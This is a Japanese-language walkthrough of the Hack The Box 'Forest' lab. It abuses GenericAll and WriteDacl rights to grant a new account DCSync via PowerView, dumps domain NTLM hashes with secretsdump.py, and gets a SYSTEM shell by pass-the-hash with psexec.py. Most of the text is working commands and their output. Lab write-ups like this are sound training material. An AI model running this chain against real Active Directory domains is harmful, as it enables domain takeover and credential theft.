参照：[Hack The Box - Forest Walkthrough](https://youtu.be/kcv9cH-nLq8)

## Exchange Windows Permissionsグループへの自身の追加と新規アカウント作成

svc-alfrescoのノードにおいて、`Reachable High Value Targes`をクリックした結果：

![スクリーンショット 2021-12-19 14 45 45](https://user-images.githubusercontent.com/85237728/146665370-fa20347c-7222-461b-81f7-c07421e7e608.png)

-> `ACCOUNT OPERATORS`のメンバは`EXCHANGE WINDOWS PERMISSIONS`に対して**GenericAll**である。つまり`EXCAHNGE WINDOWS PERMISSIONS`にユーザを作ったり、自分自身を追加したりできる。

（GenericAllのヘルプ）
> The members of the group ACCOUNT OPERATORS@HTB.LOCAL have GenericAll privileges to the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL.<br>This is also known as full control. This privilege allows the trustee to manipulate the target object however they wish.

そして、`EXCHANGE WINDOWS PERMISSIONS`のメンバーは`HTB.LOCAL`に対して**WriteDacl**の権限がある！

（Write Daclのヘルプ）
> The members of the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL have permissions to modify the DACL (Discretionary Access Control List) on the domain HTB.LOCAL.
> <br>With write access to the target object's DACL, you can grant yourself any privilege you want on the object.

まず、`net group`コマンドにて、`svc-alfresco`ユーザを`Exchange Windows Permissions`グループへ追加（svc-alfrescoはACCOUNT OPERATORに属してるから可能）。

```
*Evil-WinRM* PS C:\Users\svc-alfresco> net group "Exchange Windows Permissions" svc-alfresco /add
The command completed successfully.
```

（`net group`や`whoami /groups`で確認）

注）addしたのにメンバーになってない場合は、一旦Evil-WinRMを^Cで抜けて、もう一度接続し直すとよい。

新規ドメインアカウントを作成する。

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user shoebill Passw0rd! /add /domain
The command completed successfully.
```

新規ドメインアカウントshoebillを`EXCHANGE WINDOWS PERMISSIONS`に入れる（svc-alfrescoはACCOUNT OPERATORに属してるから可能）。

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group 'Exchange Windows Permissions' shoebill /add
The command completed successfully.
```

（できれば、`Remote Management Users`にも属させておく）

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group 'Remote Management Users' shoebill /add
The command completed successfully.
```

-> *ここまでで、まず自分svc-alfrescoを`Excange Windows Permissions`に配属させ、さらに`Exchange Windows Permissions`に新規のアカウント**shoebill**をも配属させた。*

## PowerView.ps1によるDCSync

```
*Evil-WinRM* PS C:\Users\svc-alfresco> Import-Module .\PowerView.ps1
```
> To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges.

```
*Evil-WinRM* PS C:\Users\svc-alfresco> Add-DomainObjectAcl -PrincipalIdentity shoebill -TargetIdentity 'DC=htb, DC=local' -Rights DCSync
```
＝「**htb.local**のアカウント**shoeiblll**に**DCSync**のprivilegeを持たせる」

注）`Add-DomainObjectAcl -PrincipalIdentity shoebill -TargetIdentity htb.local -Rights DCSync`ではエラー！（DCはDomain Component）.

> `Add-DomainObjectAcl`: Adds an ACL for a specific active directory object. This function modifies the ACL/ACE entries for a given Active Directory target object specified by `-TargetIdentity`.  These rights are granted on the target object for the specified `-PrincipalIdentity`.

DCSyncのprivielgeを持ったユーザが作成できたら、**secretsdump.py**でハッシュダンプ。

```
┌──(kali㉿kali)-[~]
└─$ secretsdump.py 'htb.local/shoebill:Passw0rd!@10.10.10.161'

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
...
```

最後にPass the HashでAdminのシェルゲット

```
┌──(kali㉿kali)-[~]
└─$ psexec.py Administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6

Impacket v0.9.24.dev1+20211015.125134.c0ec6102 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file zEmdPRll.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service saol on 10.10.10.161.....
[*] Starting service saol.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```


DCSync攻撃とは？...**自分がドメインコントローラになりすますことでドメイン内のユーザハッシュが上記のように取れる。**

## 何度やってもできなかったら...

```
*Evil-WinRM* PS C:\Users\svc-alfresco> $pass = ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco> $cred = New-Object System.Management.Automation.PSCredential('htb\harmj0y',$pass)
*Evil-WinRM* PS C:\Users\svc-alfresco> Add-DomainObjectAcl -Credential $cred -TargetIdentity 'DC=htb,DC=local' -PrincipalIdentity harmj0y -Rights DCSync
```

と設定してから

```
┌──(kali㉿kali)-[~]                                                                                                                                                  └─$ secretsdump.py 'htb.local/harmj0y:Passw0rd!@10.10.10.161'
```

を実行するとうまくいくかも（ここ：https://ranakhalil101.medium.com/hack-the-box-forest-writeup-w-o-metasploit-63070c9020e4 ではそうしてた。）

あと、Noriaki Hayashiさんのwriteupではntlm relayをやってた。




